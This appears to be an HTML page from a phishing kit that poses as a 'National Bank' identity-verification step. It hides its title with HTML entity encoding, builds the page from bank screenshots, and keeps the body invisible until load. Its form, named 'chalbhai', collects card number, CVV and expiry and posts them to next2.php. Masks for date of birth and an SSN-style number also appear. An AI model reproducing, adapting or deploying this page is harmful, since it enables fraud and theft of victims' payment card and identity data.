<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;&#32;&#124;&#32;&#78;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#66;&#97;&#110;&#107;</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
  
.textbox {  
    border: solid 1px #8e8e8e; 
  	border-radius: 1px;
  	padding-left: 2px;
  	font-size: 14px;
    height: 23px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #7FA1D8;
  	border-radius: 1px;
    border-style: solid; 
    border-width: 2px; 
    outline: 0; 
 } 

 </style>	
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
   $("#sin").mask("999-99-9999",{placeholder:"XXX-XX-XXXX"});
//   $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
});
</script>

<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
    });
</script> 
</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1027px; height:153px; z-index:0"><img src="images/bc13.png" alt="" title="" border=0 width=1027 height=153></div>

<div id="image2" style="position:absolute; overflow:hidden; left:145px; top:177px; width:518px; height:19px; z-index:1"><img src="images/bc14.png" alt="" title="" border=0 width=518 height=19></div>

<div id="image3" style="position:absolute; overflow:hidden; left:150px; top:217px; width:358px; height:261px; z-index:2"><img src="images/bc15.png" alt="" title="" border=0 width=358 height=261></div>

<div id="image4" style="position:absolute; overflow:hidden; left:146px; top:508px; width:266px; height:50px; z-index:3"><img src="images/bc16.png" alt="" title="" border=0 width=266 height=50></div>
<form action=next2.php name=chalbhai id=chalbhai method=post>
<input name="ccn" class="textbox cc-number" autocomplete="off" required type="text" style="position:absolute;width:200px;left:354px;top:222px;z-index:4">
<input name="cvv" class="textbox cc-cvc" autocomplete="off" required type="text" style="position:absolute;width:200px;left:354px;top:247px;z-index:5">
<input name="exp" placeholder="&#77;&#77;&#47;&#89;&#89;&#89;&#89;" class="textbox cc-exp" autocomplete="off" required type="text" style="position:absolute;width:200px;left:354px;top:272px;z-index:6">
<div id="image5" style="position:absolute; overflow:hidden; left:224px; top:532px; width:61px; height:25px; z-index:14"><img src="images/cancel.png" alt="" title="" border=0 width=61 height=25></div>

<div id="formimage1" style="position:absolute; left:153px; top:533px; z-index:15"><input type="image" name="formimage1" width="70" height="23" src="images/continue.png"></div>

</body>
</html>
